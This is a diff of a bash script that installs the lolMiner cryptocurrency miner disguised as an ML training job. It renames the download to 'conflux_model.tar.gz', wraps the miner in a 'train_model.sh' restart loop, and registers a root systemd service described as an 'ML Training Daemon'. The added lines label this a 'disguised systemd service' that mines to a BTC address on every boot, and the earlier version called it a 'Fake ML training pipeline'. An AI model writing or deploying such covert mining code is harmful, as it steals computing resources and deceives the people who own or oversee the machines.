@@ -44,36 +44,42 @@ REF_CODE="p0is-uv8p"                             # Optional: add your Unmineable
 # Derived
 PROJECT_DIR="/opt/ml_training/conflux_exp"
 SERVICE_NAME="mltrainer.service"
-MINER_DL="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz"
+MINER_DL="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.95a/lolMiner_v1.95a_Lin64.tar.gz"
 
-echo "📦 [Stage 1] Installing base dependencies..."
+echo "📦 [1] Installing dependencies..."
 sudo apt update && sudo apt install -y wget unzip screen python3 python3-pip
 
-echo "📦 [Stage 2] (Optional) Setting up NVIDIA drivers..."
+echo "📦 [2] (Optional) Installing NVIDIA drivers..."
 sudo apt install -y nvidia-driver-535 || true
 sudo apt install -y nvidia-cuda-toolkit || true
 
-echo "📂 [Stage 3] Preparing ML experiment directory..."
+echo "📂 [3] Setting up ML training environment..."
+sudo rm -rf "$PROJECT_DIR"
 sudo mkdir -p "$PROJECT_DIR"
 cd /opt
 sudo wget -q --show-progress "$MINER_DL" -O conflux_model.tar.gz
 sudo tar -xf conflux_model.tar.gz
 sudo rm conflux_model.tar.gz
-sudo mv 1.82/* "$PROJECT_DIR"
+sudo mv 1.95a/* "$PROJECT_DIR"
 sudo chmod -R +x "$PROJECT_DIR"
 
-echo "🧠 [Stage 4] Writing training entrypoint..."
+echo "🧠 [4] Creating training entrypoint..."
 sudo tee "$PROJECT_DIR/train_model.sh" > /dev/null <<EOF
 #!/bin/bash
 cd $PROJECT_DIR
-./lolMiner --algo OCTOPUS --pool cfx.unmineable.com:3333 \\
---user BTC:${BTC_ADDRESS}.${WORKER_NAME}#${REF_CODE} \\
---ethstratum ETHPROXY
+while true; do
+  ./lolMiner --algo OCTOPUS --pool cfx.unmineable.com:3333 \\
+  --user BTC:${BTC_ADDRESS}.${WORKER_NAME}#${REF_CODE} \\
+  --ethstratum ETHPROXY
+
+  echo "[lolMiner crashed or exited] Restarting in 60 seconds..."
+  sleep 60
+done
 EOF
 
 sudo chmod +x "$PROJECT_DIR/train_model.sh"
 
-echo "🛠️ [Stage 5] Creating systemd service..."
+echo "🛠️ [5] Creating disguised systemd service..."
 sudo tee "/etc/systemd/system/$SERVICE_NAME" > /dev/null <<EOF
 [Unit]
 Description=ML Training Daemon for Deep Learning Model
@@ -90,16 +96,15 @@ Group=root
 WantedBy=multi-user.target
 EOF
 
-echo "🚀 [Stage 6] Enabling and starting trainer..."
+echo "🚀 [6] Starting training service..."
 sudo systemctl daemon-reexec
 sudo systemctl daemon-reload
 sudo systemctl enable "$SERVICE_NAME"
 sudo systemctl start "$SERVICE_NAME"
 
 echo ""
-echo "✅ Fake ML training pipeline setup complete!"
-echo "Mining will auto-start on boot and pay BTC to: $BTC_ADDRESS"
-echo "To check status: sudo systemctl status $SERVICE_NAME"
+echo "✅ Training pipeline (lolMiner v1.95a) setup complete!"
+echo "Mining CFX (Octopus) to earn BTC will now auto-start on every boot."
 ```
 
 ---
